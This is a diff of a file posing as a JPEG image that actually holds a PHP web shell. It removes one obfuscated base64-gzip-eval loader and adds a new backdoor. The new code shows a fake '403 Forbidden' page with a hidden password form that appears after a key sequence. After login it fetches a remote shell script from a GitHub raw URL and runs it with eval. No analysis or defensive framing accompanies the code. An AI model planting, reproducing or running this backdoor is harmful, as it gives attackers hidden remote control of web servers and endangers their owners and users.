@@ -1,12 +1,79 @@
 ���� JFIF      ��
+<?php
+$auth_pass = "2b2abc5a7d63b5489a546c7a520cd7b03e1f26ac67635b8df247501f8b5cb99a";
 
-<?php $Apaaja = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1KBrNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUMn0SyzJSMwLKMrMK85JrdRE\x41tY\x41";$iNathanPrinsley = "h\x43wNT5\x61\x2bZIhwxvOPmoOpWPg/v4yDO\x41dh63TkyGZU63Hhn3t\x4395l\x2bi6lfzwLUF2S\x2bKPk7diH1\x2bQ\x42ipWVEpwhsOLG9HfLmXfPPO2Zju\x63R0JePeR37eVvFO9YMDsdqe64d6OwvDsfryKS9VLss0uqiFDsZp1\x62j4Q95R\x41ZRxkW\x4381QTflJ\x428M\x43\x61RhviD8wy9u29Z\x6158deXim\x61ISWgrQGwN6Krthnuyz8RPQKjoUDH0u1UUfWZOlKL7fXSZX18\x62\x42TxHyfk/85IXdPq2X\x43\x62O6\x62zftJN9LS8z264n9mTOoplsTenDzELNs5QNU3TWxSmpj83uIz\x42/KFhrl2Fyi3i5\x42fys3DM\x43Zr5nJTYHV\x42OOEIgztOKKgZ6s0t1LkyTZsSyFEph6xoZOSuxpT8vu\x2bN\x61\x2bG3OXZS2nT8d\x43X0dxJ7StL\x627z5\x432WntNztv7\x41kX\x428QKN6jrNpNQi1kWEiHYTIGZ5JefrVT\x616M5tGx8/3\x62iT\x62WTd0R30yxfIkn41\x62\x63z\x631l3/ZUDf2Re2jD5rFzhfDGPzeqLM8\x62H9JXdHG\x41uFyF0\x6165q\x61K/9We\x43y\x42Hi0RX5Y8kXi\x61LvO9ygZSE\x61IN6FOXn2XJh\x417/jJiyDHKPZjl9\x2btv\x2b0QX\x2bVy5eFX5JTVmVPY\x412NjE\x42O7rv01K4\x638YK9mf5vkz5r\x62V\x2bYXl\x63XUwz\x41jVg\x62k\x2buvd\x61PQ7dmMqrTwk\x61W\x61ER\x62NqW4iV9N9q3/\x2b\x42ex\x63OYXp8\x437/QrMZEVQ\x63\x635lpz3vu\x613NIsUT0S\x43OwlswGYNpKy\x2bNQ8OeHWgUtQenpZ/eN4l\x42pfVgwjkVP8Tgsx\x63ZNkZQwkemV95sPZDJuroZ1zGdJZ\x41LZDpNmT4TfOlnGo15\x62SyqiDFRnt/V2\x42UNyXyK\x62FSrLSgQw\x62Vvgv\x42jXWvW12G/KFjZx2M9sY\x2bs6R1vl\x43ez6tQJO6HzXr\x62kFPR9ls031udFjhMvkM\x63m\x439g1\x63\x637\x2bkK7\x41mzn99ilgrgx8\x61iETFQ\x62MZE\x41JlezY87ixQ2sYTY8K\x422MXQI6n\x41pDzF8OGuMkqDxw\x61kLy\x43xmZ50tPIQfdIgNIhVEpljEQrowokpK\x63FJ\x43u\x41\x41Z\x42pJp\x43fDLhFPQOLMjwRDkD\x628y\x41twsvWIGjfE4\x62DIYWNvM\x41\x2bMs2Sj3Ry22GO4O2KIhh\x61FFvJIN4Rq\x61\x42MgDI83nvGVrv2Y7xTZm2\x61oX1gDP4w9fUN9UtuXej\x61NerW78Nmpno9drlzl1xWl\x616ZFoinYN38deJdJUernu1de\x2b\x2bO5IN\x636yw8\x41ZSq\x63\x41JyhgiHop\x63FV\x63whF\x41RZ\x423\x2bh\x63fvP\x2b4LJ/y\x610ZmUoms\x2b3/VMZV34t\x61Pu\x41dKLOqSYWoRTVuVNplp\x43K\x412XLUWqpUWNuVDL8/Rsj9T\x42Oj/0\x61V1I/mMQ2\x42wJe8vx\x41kH\x41/WMQ6\x42wJe8vw\x410H\x41/GMQ\x2b\x42wJe7vP\x42EEw\x2b2TQ\x43\x42wJe";eval(htmlspecialchars_decode(gzinflate(base64_decode($Apaaja))));exit;?>
+function Login() {
+    die("<html>
+    <title>403 Forbidden</title>
+    <center><h1>403 Forbidden</h1></center>
+    <hr><center>nginx (apache v.168 NowMeee) </center>
+    <center>
+    <div style='cursor:pointer;'></div>
+    <form id='login-form' method='post' style='display:none;'>
+        <input style='text-align:center;margin:0;margin-top:0px;background-color:#fff;border:1px solid #fff;' type='password' name='pass'>
+    </form>
+    <script>
+    let clickCount = 0;
+    document.addEventListener('keydown', function(event) {
+        if (event.key === '3') {
+            clickCount++;
+            if (clickCount === 3) {
+                document.getElementById('login-form').style.display = 'block';
+            }
+        } else {
+            clickCount = 0;
+        }
+    });
+    </script>
+    </center>");
+}
+
+function VEsetcookie($k, $v) {
+    $_COOKIE[$k] = $v;
+    setcookie($k, $v);
+}
+function fetchRemoteContent($url) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10); // Timeout 10 detik
+    $content = curl_exec($ch);
+    if (curl_errno($ch)) {
+       
+        error_log('Error fetching remote content: ' . curl_error($ch));
+        curl_close($ch);
+        return false;
+    }
+    curl_close($ch);
+    return $content;
+}
 
 
+function is_logged_in() {
+    global $auth_pass;
+    return isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) && ($_COOKIE[md5($_SERVER['HTTP_HOST'])] == $auth_pass);
+}
 
-			
-
-		
+
+if (is_logged_in()) {
+ 
+    $a = fetchRemoteContent('https://raw.githubusercontent.com/XJ303/shell-Xjerry/refs/heads/main/Xzjerry-wolfshell.php');
+    if ($a !== false) {
+        eval('?>' . $a);
+    } else {
+
+        die('Failed to fetch remote content.');
+    }
+} else {
+ 
+    if (isset($_POST['pass']) && (hash('sha256', $_POST['pass']) == $auth_pass)) {
+        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
+    }
+    if (!is_logged_in()) {
+        Login();
+    }
+}
+?>
 
 
 �� C	��    ��               �� "          #Qr��               �� &         1! A"2qQa���   ? �y,�/3J�ݹ�߲؋5�Xw���y�R��I0�2�PI�I��iM����r�N&"KgX:����nTJnLK��@!�-����m�;�g���&�hw���@�ܗ9�-�.�1<y����Q�U�ہ?.����b߱�֫�w*V��) `$��b�ԟ��X�-�T��G�3�g ����Jx���U/��v_s(H� @T�J����n��!�gfb�c�:�l[�Qe9�PLb��C�m[5��'�jgl���_���l-;"Pk���Q�_�^�S�  x?"���Y騐�O�	q�`~~�t�U�Cڒ�V		I1��_��
